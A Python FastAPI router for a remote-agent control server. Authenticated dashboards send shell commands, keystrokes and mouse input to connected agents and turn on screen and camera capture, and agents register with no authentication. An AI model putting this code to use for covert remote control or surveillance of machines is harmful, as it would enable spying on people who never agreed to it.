from fastapi import APIRouter, WebSocket, WebSocketDisconnect
from agent_manager import manager
import json
from auth import verify_token

router = APIRouter()

@router.websocket('/ws/agent')
async def ws_agent(ws: WebSocket):
    await ws.accept()
    agent_id = None
    try:
        # Expect handshake message with agent_id and agent_name
        init = await ws.receive_text()
        try:
            info = json.loads(init)
        except Exception:
            info = {}
        agent_id = info.get('agent_id') or 'unknown-agent'
        agent_name = info.get('agent_name') or agent_id
        http_base = info.get('http_base') or 'http://localhost:8000'
        has_camera = bool(info.get('has_camera'))
        await manager.register_agent(agent_id, agent_name, http_base, ws, has_camera)

        # Stream messages from agent to dashboards
        while True:
            msg = await ws.receive_text()
            try:
                data = json.loads(msg)
            except Exception:
                data = {"output": msg}

            # Handle agent RPC responses (e.g., stats)
            if isinstance(data, dict) and data.get('type') == 'stats_response':
                req_id = data.get('request_id')
                payload = data.get('data') if 'data' in data else {"error": data.get('error', 'Unknown error')}
                await manager.complete_stats_request(req_id, payload)
                continue

            if 'output' in data:
                await manager.relay_output_to_dashboards(agent_id, str(data['output']))
            elif 'line' in data:
                await manager.relay_output_to_dashboards(agent_id, str(data['line']))
            elif 'exit_code' in data:
                await manager.relay_exit_to_dashboards(agent_id, int(data['exit_code']))
            elif data.get('type') == 'screen_frame':
                frame = {k: data[k] for k in ('data','w','h','ts') if k in data}
                await manager.relay_screen_to_dashboards(agent_id, frame)
            elif data.get('type') == 'camera_frame':
                frame = {k: data[k] for k in ('data','w','h','ts') if k in data}
                await manager.relay_camera_to_dashboards(agent_id, frame)
            elif 'error' in data:
                await manager.relay_output_to_dashboards(agent_id, str(data['error']))
            else:
                # Unrecognized; forward raw
                await manager.relay_output_to_dashboards(agent_id, msg)

    except WebSocketDisconnect:
        pass
    finally:
        if agent_id:
            await manager.remove_agent(agent_id)

@router.websocket('/ws/dashboard')
async def ws_dashboard(ws: WebSocket):
    # Require auth token in query string
    token = ws.query_params.get('token')
    if not token or not verify_token(token):
        # Policy violation
        await ws.close(code=1008)
        return

    await ws.accept()
    await manager.register_dashboard(ws)
    try:
        while True:
            msg = await ws.receive_text()
            try:
                data = json.loads(msg)
            except Exception:
                data = {}
            target = data.get('target')
            if target and 'command' in data:
                command = data.get('command')
                ok = await manager.forward_command(target, command)
                if not ok:
                    await ws.send_json({"type": "error", "message": f"Agent {target} not available"})
            elif target and data.get('type') in (
                'start_interactive','stdin','end_interactive',
                'screen_start','screen_stop','mouse','keyboard',
                'camera_start','camera_stop','queue_reset'
            ):
                ok = await manager.forward_json(target, data)
                if not ok:
                    await ws.send_json({"type": "error", "message": f"Agent {target} not available"})
    except WebSocketDisconnect:
        pass
    finally:
        # Remove from dashboard set
        try:
            await manager.remove_dashboard(ws)
        except Exception:
            pass
